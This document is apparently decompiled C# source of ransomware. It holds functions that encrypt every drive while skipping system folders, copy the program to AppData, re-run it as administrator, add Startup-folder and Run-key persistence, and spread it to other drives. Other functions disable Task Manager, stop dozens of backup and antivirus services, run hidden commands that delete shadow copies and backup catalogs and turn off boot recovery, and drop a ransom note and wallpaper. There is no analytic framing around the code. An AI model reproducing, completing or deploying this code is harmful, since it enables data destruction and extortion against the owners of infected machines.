	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_0190: Unknown result type (might be due to invalid IL or missing references)
		//IL_0196: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
